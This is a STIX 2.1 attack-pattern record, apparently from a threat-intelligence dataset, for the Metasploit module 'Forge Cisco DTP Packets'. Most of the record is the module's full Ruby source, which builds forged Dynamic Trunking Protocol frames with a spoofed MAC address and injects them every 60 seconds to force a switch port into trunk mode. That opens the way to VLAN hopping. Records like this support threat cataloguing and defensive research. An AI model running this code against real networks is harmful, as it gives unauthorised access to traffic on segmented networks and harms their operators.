{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3f35bc4b-4413-44d7-892d-64f6b9e57e5b",
    "created": "2024-08-14T16:32:54.99838Z",
    "modified": "2024-08-14T16:32:54.998384Z",
    "name": "Forge Cisco DTP Packets",
    "description": " This module forges DTP packets to initialize a trunk port. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/spoof/cisco/dtp.rb",
            "external_id": "dtp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Capture\n\n  def initialize(info = {})\n    super(\n      'Name'        => 'Forge Cisco DTP Packets',\n      'Description'\t=> %q{\n        This module forges DTP packets to initialize a trunk port.\n      },\n      'Author'\t\t=> [ 'Spencer McIntyre' ],\n      'License'\t\t=> MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Service', 'Description' => 'Run DTP forging service' ]\n        ],\n      'PassiveActions' => [ 'Service' ],\n      'DefaultAction'  => 'Service'\n    )\n    register_options(\n      [\n        OptString.new('SMAC',    \t[false, 'The spoofed mac (if unset, derived from netifaces)']),\n      ])\n    deregister_options('RHOST', 'PCAPFILE')\n  end\n\n  def setup\n    super\n    unless datastore['SMAC'] || datastore['INTERFACE']\n      raise ArgumentError, 'Must specify SMAC or INTERFACE'\n    end\n  end\n\n  def build_dtp_frame\n    p = PacketFu::EthPacket.new\n    p.eth_daddr = '01:00:0c:cc:cc:cc'\n    p.eth_saddr = smac\n    llc_hdr =\t\"\\xaa\\xaa\\x03\\x00\\x00\\x0c\\x20\\x04\"\n    dtp_hdr =\t\"\\x01\"\t\t\t\t\t\t\t\t# version\n    dtp_hdr <<\t\"\\x00\\x01\\x00\\x0d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\t\t# domain\n    dtp_hdr <<\t\"\\x00\\x02\\x00\\x05\\x03\"\t\t\t\t\t\t# status\n    dtp_hdr <<\t\"\\x00\\x03\\x00\\x05\\x45\"\t\t\t\t\t\t# dtp type\n    dtp_hdr <<\t\"\\x00\\x04\\x00\\x0a\" << PacketFu::EthHeader.mac2str(smac)\t\t# neighbor\n    p.eth_proto = llc_hdr.length + dtp_hdr.length\n    p.payload = llc_hdr << dtp_hdr\n    p\n  end\n\n  def is_mac?(mac)\n    !!(mac =~ /^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$/)\n  end\n\n  def smac\n    @spoof_mac ||= datastore['SMAC']\n    @spoof_mac ||= get_mac(datastore['INTERFACE']) if netifaces_implemented?\n    return @spoof_mac\n  end\n\n  def run\n    unless smac()\n      print_error 'Source MAC (SMAC) should be defined'\n    else\n      unless is_mac? smac\n        print_error \"Source MAC (SMAC) `#{smac}' is badly formatted.\"\n      else\n        print_status \"Starting DTP spoofing service...\"\n        open_pcap({'FILTER' => \"ether host 01:00:0c:cc:cc:cc\"})\n        interface = datastore['INTERFACE'] || Pcap.lookupdev\n        dtp = build_dtp_frame()\n        @run = true\n        while @run\n          capture.inject(dtp.to_s)\n          select(nil, nil, nil, 60)\n        end\n        close_pcap\n      end\n    end\n  end\nend\n"
}